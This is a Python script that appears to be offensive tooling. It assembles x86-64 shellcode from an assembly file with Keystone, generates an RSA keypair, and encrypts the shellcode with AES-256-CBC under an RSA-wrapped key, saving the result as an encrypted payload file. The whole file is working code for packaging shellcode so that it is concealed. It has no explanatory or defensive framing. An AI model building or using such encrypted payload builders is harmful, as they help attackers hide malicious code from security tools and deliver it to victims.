import os
import subprocess
import struct
from keystone import *
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def read_assembly_from_file(filename):
    with open(filename, 'r') as f:
        return f.read()

CODE = read_assembly_from_file('asm-swiss.asm')

def generate_keys():
    print("[*] Generating keys...")
    subprocess.run(["openssl", "genrsa", "-out", "private.pem", "2048"], check=True)
    subprocess.run(["openssl", "rsa", "-in", "private.pem", "-pubout", "-out", "public.pem"], check=True)
    print("[+] Keys generated")

def generate_shellcode():
    print("\n[*] Generating Shellcode...")
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    encoding, count = ks.asm(CODE)
    sh = b""
    for e in encoding:
        sh += struct.pack("B", e)
    return sh

def encrypt_payload(shellcode):
    print("\n[*] Starting Encryption...")
    
    with open("public.pem", "rb") as f:
        public_key = serialization.load_pem_public_key(f.read())

    aes_key = os.urandom(32) # 256 bits
    aes_iv = os.urandom(16)  # 128 bits
    
    print(f"[debug] AES Key: {aes_key.hex()}")
    print(f"[debug] AES IV:  {aes_iv.hex()}")

    # encrypt with AES
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(aes_iv))
    encryptor = cipher.encryptor()
    
    # PKCS7 padding
    block_size = 16
    padding_len = block_size - (len(shellcode) % block_size)
    padded_shellcode = shellcode + bytes([padding_len] * padding_len)
    
    ciphertext = encryptor.update(padded_shellcode) + encryptor.finalize()

    # encrypt AES Key + IV with RSA
    # format: IV + Key (16 + 32 = 48 bytes)
    secret_data = aes_iv + aes_key
    
    encrypted_secret = public_key.encrypt(
        secret_data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    
    final_payload = encrypted_secret + ciphertext
    
    with open("enc_payload.bin", "wb") as f:
        f.write(final_payload)
    
    print(f"[+] Encrypted payload saved to enc_payload.bin")
    print(f"    Total Size: {len(final_payload)} bytes")
    print(f"    Encrypted Key Block: {len(encrypted_secret)} bytes")
    print(f"    Encrypted Shellcode: {len(ciphertext)} bytes")

if __name__ == "__main__":
    try:
        generate_keys()
        sh = generate_shellcode()
        print(f"[+] Raw Shellcode generated: {len(sh)} bytes")
        encrypt_payload(sh)
    except Exception as e:
        print(f"[!] Error: {e}")
